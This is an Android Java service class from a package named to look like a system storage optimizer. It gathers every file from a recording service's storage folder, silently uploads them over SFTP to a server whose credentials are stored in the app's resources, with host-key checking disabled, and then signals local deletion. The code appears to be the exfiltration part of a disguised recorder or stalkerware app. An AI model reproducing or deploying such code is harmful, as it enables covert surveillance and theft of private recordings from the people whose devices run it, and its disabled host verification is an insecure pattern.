package com.android.sd.optimize;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Locale;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpException;

public class Util extends IntentService {

    private String LOG_TAG = AppGlobals.getLogTag(getClass());
    private Session mSession;
    private Channel mChannel;
    private ChannelSftp mChannelSftp;
    private DBHandler dbHandler;
    private String tobeDeleted;
    private ArrayList<String> finishedItemToDelete = null;
    private ArrayList<String> finishedItemToUpload = null;
    private ArrayList<String> filesList = null;
    private ArrayList<String> finishedFiles = null;

    public Util() {
        super("test");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        dbHandler = new DBHandler(getApplicationContext());
        String mCurrentFile = intent.getStringExtra("currentFile");
        ArrayList<String> listToDelete = dbHandler.retrieveDate("tobedeleted");
        ArrayList<String> listToUpload = dbHandler.retrieveDate("filename");
        finishedItemToDelete = new ArrayList<>();
        finishedItemToUpload = new ArrayList<>();
        filesList = new ArrayList<>();
        finishedFiles = new ArrayList<>();
        filesList = getAllFilesFromFolder();
        if (!listToDelete.isEmpty() && listToDelete.size() > 0) {
            for (String item: listToDelete) {
                if (item != null) {
                    finishedItemToDelete.add(item);
                }
            }
        }
        if (!listToUpload.isEmpty() && listToUpload.size() > 0) {
            for (String item: listToUpload) {
                if (item != null) {
                    finishedItemToUpload.add(item);
                }
            }
        }
        if (!filesList.isEmpty() && filesList.size() > 0) {
            for (String item : filesList) {
                if (item != null) {
                    finishedFiles.add(item);
                }
            }
        }

        if (finishedItemToDelete.size() > 0 || finishedItemToUpload.size() > 0 ||
                mCurrentFile != null || finishedFiles.size() > 0 ) {
            try {
                URL url = new URL("http://google.com");
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setConnectTimeout(3000);
                urlConnection.connect();
                if (urlConnection.getResponseCode() == 200) {
                    connectToServer();
                    if (!finishedItemToDelete.isEmpty() && finishedItemToDelete.size() > 0) {
                        deletedFileAtServer(finishedItemToDelete);
                    } else if (mCurrentFile != null || finishedItemToUpload.size() > 0) {
                        Log.i(AppGlobals.getLogTag(getClass()), "Running Upload...");
                        if (mCurrentFile != null) {
                            uploadFileToServer(new ArrayList<>(Arrays.asList(mCurrentFile)));
                        } else {
                            uploadFileToServer(finishedItemToUpload);
                        }
                    } else if (finishedFiles.size() > 0) {
                        Log.i(AppGlobals.getLogTag(getClass()), "Running files...");
                        uploadFileToServer(finishedFiles);
                    }
                }
            } catch (MalformedURLException e1) {
                e1.printStackTrace();
            } catch (IOException e) {
                if (mCurrentFile != null) {
                    dbHandler.createNewFileNameForUpload("filename", mCurrentFile);
                }
            }
        }
    }

    ArrayList<String> getAllFilesFromFolder() {
        File files = new File(RecordService.DEFAULT_STORAGE_LOCATION);
        File[] list = files.listFiles();
        ArrayList<String> arrayList = new ArrayList<>();
        if (files.listFiles() == null) {
            return arrayList;
        }
        int lists = files.listFiles().length;

        for(int i=0; i < lists; i++) {
            if(!list[i].isHidden()) {
                arrayList.add(list[i].getAbsolutePath());
            }
        }
        return arrayList;
    }

    public static String getTime() {
        Calendar c = Calendar.getInstance();
        SimpleDateFormat df = new SimpleDateFormat("yyyyMMdd-HHmmss", Locale.getDefault());
        String formattedDate = df.format(c.getTime());
        return formattedDate;
    }

    void deletedFileAtServer(ArrayList<String> path) {
        String file = null;
        try {
            for (String item: path) {
                System.out.println(item);
                if (item != null) {
                    file = item;
                    mChannelSftp.rm(item);
                    Log.i(LOG_TAG, "file deleted");
                    dbHandler.deleteUploadedFile("tobedeleted", item);
                }
            }
        } catch (SftpException e) {
            Log.i(AppGlobals.getLogTag(getClass()), "File is Not on Server");
            if (file != null) {
                dbHandler.deleteUploadedFile("tobedeleted", file);
            }
        }
    }

    private void uploadFileToServer(ArrayList<String> arrayLists) {
        try {
            for (String item: arrayLists) {
                if (item != null) {
                    File file = new File(item);
                    if (mChannel == null && mChannel == null) {
                        Log.i(AppGlobals.getLogTag(getClass()), "Not Really Connected To Server...");
                        if (!dbHandler.checkIfItemAlreadyExist(item)) {
                            Log.i(AppGlobals.getLogTag(getClass()), "item added");
                            dbHandler.createNewFileNameForUpload(" filename", item);
                        }
                        stopSelf();
                        return;
                    }
                        mChannelSftp.put(new FileInputStream(file), file.getName());
                        Log.i(LOG_TAG, "BroadCast sent...");
                        Intent intent = new Intent("com.byteshaft.deleteData");
                        intent.putExtra("FILE_NAME", item);
                        sendBroadcast(intent);
                        Log.i(LOG_TAG, "upload done");
                        tobeDeleted = item;
                }
            }
        } catch (FileNotFoundException e) {
            Log.e(LOG_TAG, "File Not found");
            if (tobeDeleted != null) {
                dbHandler.deleteUploadedFile("tobedeleted", tobeDeleted);
            }
        } catch (SftpException e) {
            Log.e(LOG_TAG, "Error in uploading");
            if (tobeDeleted != null) {
                if (!dbHandler.checkIfItemAlreadyExist(tobeDeleted)) {
                    dbHandler.createNewFileNameForUpload("tobedeleted", tobeDeleted);
                    dbHandler.deleteUploadedFile("filename", tobeDeleted);
                }
            }
            }
    }

    private void connectToServer() {
        String userName = getApplicationContext().getResources().getString(R.string.sftp_username);
        String password = getApplicationContext().getResources().getString(R.string.sftp_password);
        String host = getApplicationContext().getResources().getString(R.string.sftp_host);
        String port = getApplicationContext().getResources().getString(R.string.sftp_port);
        String workingDirectory = getApplicationContext().getResources().getString(R.string.sftp_working_directory);
        JSch jsch = new JSch();
        try {
            mSession = jsch.getSession(userName, host, Integer.valueOf(port));
            mSession.setPassword(password);
            java.util.Properties config = new java.util.Properties();
            config.put("StrictHostKeyChecking", "no");
            mSession.setConfig(config);
            mSession.connect();
            Log.i(LOG_TAG, "Host connected.");
            mChannel = mSession.openChannel("sftp");
            mChannel.connect();
            Log.i(LOG_TAG, "sftp channel opened and connected.");
            mChannelSftp = (ChannelSftp) mChannel;
            mChannelSftp.cd(workingDirectory);
        } catch (JSchException ignore) {
            stopSelf();
        } catch (SftpException e) {
            stopSelf();
        }
    }
}